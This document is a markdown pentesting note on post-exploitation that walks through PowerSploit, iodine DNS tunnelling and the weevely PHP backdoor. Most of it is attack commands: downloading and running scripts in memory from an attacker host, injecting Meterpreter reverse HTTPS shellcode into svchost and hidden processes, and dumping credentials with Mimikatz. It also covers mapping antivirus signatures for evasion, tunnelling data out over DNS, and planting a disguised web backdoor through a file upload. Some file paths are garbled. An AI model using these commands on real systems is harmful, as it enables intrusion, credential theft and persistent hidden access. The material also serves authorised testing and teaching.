# Post Exploitation 

Once the Information Gathering, Vulnerability Analysis, and Exploitation phases are complete, the Post Exploitation phase can begin. Despite compromising a couple of systems, the Post Exploitation phase does not signal a finished job. 

The main goals of the Post Exploitaiton Phase are; 

1. Targeting specific systems 
2. Identifying Critical Infrastructure 
3. Target Information most valuable to the company 

It can be thought of exploiting in a more controlled manner, rather than in general. 

## OS Backdoors 

A backdoor attack refers to any method that authorized and unauthorized users are able to bypass normal security measures to gain root access on a computer system, a network, or software application.

##### How does backdoor malware work? 

They can be classified as a Trojan and are refered to as a malicious computer program that is pretending to be something it's not in order to deliver malware, open up backdoors, or steal data. 

### powersploit 

This tool is a collection of PowerShell scripts and modules that can perform tasks such as,

1. Code Execution
2. Persistence
3. Anitvirus Bypassing
4. Recon
5. Exfiltration 

A compilation of cmdlets that can be used are found here: https://github.com/PowerShellMafia/PowerSploit

**python -m SimpleHTTPServer** # starting a web server

All the files in the PowerSploit directory are accessed through the web at:

**http://<ip_address\>:8000/**


Which should give back this information: 

1. Antivirus Bypass	
    - Find bytes of a file which has a matching signature in antivirus.
    
2. Code Execution	
    - Used to execute code on victim machine.
    
3. Exfiltration	
    - Manipulate and collect information & data from victim machine(s).
    
4. Persistence	
    - Maintain control to machine by adding persistence to scripts.

5. PE Tools	
    - Handy PowerShell cmdlets for enumeration.

6. Recon	
    - Perform reconnaissance tasks using victim machine.

7. Reverse Engineering
    - Help perform reverse engineering & malware analysis. It has now been moved to PowerShellArsenal.

8. Script Modification	
    - Create and manipulate scripts on victim machine.

##### Invoke-Shellcode

This script can be used to inject a custom shellcode or metasploit payload into an existing process and then execute it. These scripts are not flagged by antiviruses, and files are not written on disk. 

In PowerShell the following command will install that PowerShell script for the current process. 

**IEX (New-Object Net.WebClient).DownloadString("http://<ip_address>/full_path/script_name.ps1”)**  # syntax 

**IEX (New-Object Net.WebClient).DownloadString(“http://10.0.0.14:8000/CodeExecution/Invoke-Shellcode.ps1”)** # Invoke-Shellcode example 

The payload is then injected into the current PowerShell process and a Meterpreter Reverse HTTPS shell should be recieved. 

**Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 10.0.0.14 -Lport 4444 -Force** # injected payload

##### Injecting in existing processes

In Powershell get the process IDs using "Get-Process", then inject the Metasploit Payload into the **svchost** process with a PID of **1228**.

**Invoke-Shellcode -ProcessId 1228 -Payload windows/meterpreter/reverse_https -Lhost <\IP address\> -Lport 4444** 

##### Injecting a New Process

First you have to create a new hidden process. 

**Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden**

Inject the new process

**Invoke-Shellcode -ProcessId 1476 -Payload windows/meterpreter/reverse_https -Lhost <\IP address\> -Lport 6666 -Force** 

##### Find-AVSignature

A cmdlet used to bypass the anti-virus software by spliting a file into specific byte sizes and storing them in separate files. The anti-virus then find and removes them allowing for the parts of the file with the AVSignature to be detected. 

Install the PowerShell Scripts "Find-AVSignature" :

**IEX (New-Object Net.WebClient).DownloadString(“http://10.0.0.14:8000/AntivirusBypass/Find-AVSignature.ps1”)**

Run the script on a Meterpreter Windows Executable: 

**Find-AVSignature -StartByte 0 -EndByte 6144 -Interval 50 -Path C:testexemptnc.exe -OutPath c:usersmasterDesktopmsf.exe -OutPath c:usersmasterDesktoprun1 -Verbose**

The anti-virus has detected the msf.exe and the parts with the AVSignature are visable. 

##### Invoke-ReverseDnsLookup

This cmdlet gives ust the ability to find the DNS Pointer Records for their corresponding IP addresses.

Install Recon PowerShell Script: 

**IEX (New-Object Net.WebClient).DownloadString(“http://10.0.0.14:8000/Recon/Invoke-ReverseDnsLookup.ps1”)**


Execute the cmdlet: 

**Invoke-ReverseDnsLookup -IpRange <IP_Address/Range>**

##### Get-HttpStatus

Used to dictionary a web server in order to find the HTTP status of a path on the HTTP/HTTPS service. 

Cons: 

1. Doesn't have a lot of features
2. Doesn't support nested dictionary attack 
    - Only accepts a file containing a path name/file name


**IEX (New-Object Net.WebClient).DownloadString(“http://10.0.0.14:8000/Recon/Get-HttpStatus.ps1”)** # install 

**Get-HttpStatus -Target 10.0.0.7 -Path c:usersmasterDesktopdirectory-list-2.3-small.txt**

If the website is using SSL, there is a switch that can be used to send HTTPS requests: 

**Get-HttpStatus -Target 10.0.0.7 -Path c:usersmasterDesktopdirectory-list-2.3-small.txt -UseSSL**

If the service is running on some other port, the **-Port** switch can be used:

**Get-HttpStatus -Target 10.0.0.7 -Path c:usersmasterDesktopdirectory-list.txt -Port 8080**

##### Invoke-Mimikatz

A benefit over using this cmdlet over the MimiKatz executable, is that it remains in memory and can be used to dump, 

1. Credentials
2. Certificates
3. Etc. 


**IEX (New-Object Net.WebClient).DownloadString(“http://10.0.0.14:8000/Exfiltration/Invoke-Mimikatz.ps1”)** # installl 

Dump credentials using:

**Invoke-Mimikatz -DumpCreds**

## Tunneling and Exfiltration 

DNS Tunneling allows attackers to get data in and out without alerting firwalls and bypassing most security measures. 

##### Data Exchange over the DNS protocol 

Since the DNS protocol is a core component of the IP suite, the main goal is to translate the hostnames to IP addresses. It plays a crucial role in the internet and misconfiguration can lead to network disxonnects and therefore isn't restricted with security policies as often. 

### iodine 

A cross-platform tool that performs DNS tunneling

**\* \`A record\`: tunnelhost -> <\host ip\>  (maps tunnelhost.yourdomain.com to <\server's ip\>) # omit "\"**


**\* \`NS record\`: tunnel -> tunnelhost.yourdomain.com # omit "\"**

The code above adds 2 DNS records to the attacker's domain DNS system

**sudo ./iodined -c -f <server ip\> -P secretpassword  tunnel.yourdomain.com** # run iodine server

**sudo ./iodine -I 50 -f -P secretpassword  tunnel.yourdomain.com** # run iodine client

After that is done, it's worthwhile to run an **ifconfig** to show that there are no interfaces and a **ping** to the server to ensure that the tunnel is set up. 

## Web Backdoors

### weevely

Weevely allows for remote code actions through a snippet of php code by creating a terminal on the target server. It includes features such as, 

1. Privilege Escalation
2. Network Lateral Movement 
3. Administration and Maintenance Needs

**./weevely.py**

First run weevely by itself as shown above. 

**./weevely.py generate mypassword myfilename.php** 

In the command above weevely is generating a backdoor agent with a password: **mypassword** , and a php file: **myfilename.php**. 


**SIDE NOTE: DONT EVER MAKE FILE NAMES OBVIOUS**

Third step is to copy/paste the contents of the new php file, **myfilename.php**, into an accessible PHP file on the server(info.php). It shouldn't affect the accessible server php file as it'll remain quiet until called upon.

Fourth, using a vulnerable website with the ability to upload a file, upload the info.php file.

**./weevely.py http://some.websitename.com/myfilename.php mypassword** 

The command above allows the Attacker to access the newly created backdoor. 
